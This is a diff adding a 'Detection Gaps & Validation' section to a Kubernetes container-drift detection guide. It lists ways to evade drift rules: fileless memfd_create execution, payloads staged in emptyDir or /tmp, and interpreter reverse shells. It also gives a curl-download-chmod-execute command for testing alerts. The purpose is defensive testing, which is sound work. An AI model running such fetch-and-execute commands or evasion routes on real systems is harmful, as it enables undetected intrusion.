@@ -37,6 +37,15 @@ Container drift occurs when running containers deviate from their original image
 - When SOC analysts need structured procedures for this analysis type
 - When validating security monitoring coverage for related attack techniques
 
+## Detection Gaps & Validation
+
+- **Upper-layer baseline misses fileless execution:** `proc.is_exe_upper_layer = true` only flags binaries written to the container's overlay upper layer. A binary dropped into an `emptyDir`/tmpfs mount or run via `memfd_create` (fileless) executes from a different layer and slips past the drift rule.
+- **Interpreter abuse:** a reverse shell run as `python -c`, `perl`, or `node -e` reuses an in-image binary, so neither the new-binary nor the package-manager rule fires - add `proc.cmdline` content matching for interpreters.
+- **`readOnlyRootFilesystem: true` is not enough:** writable `volumeMounts` (`/tmp`, cache) are legitimate write targets; attackers stage payloads there. The file-write rule already excludes `/tmp`, so drift into those paths is invisible.
+- **Renamed package managers / static busybox** evade the `proc.name in (apt, yum, ...)` list.
+- **Mutable image tags** defeat digest verification - the script only warns, it does not block.
+- **How to validate the rule fires:** `kubectl exec` into a test pod, `curl -o /root/x http://.../payload && chmod +x /root/x && /root/x`, and confirm the *Drift Detected* and *Container Shell Spawned* rules emit alerts. Drop the same binary into a mounted `emptyDir` to confirm the known coverage gap.
+
 ## Prerequisites
 
 - Kubernetes cluster v1.24+ with runtime security tooling
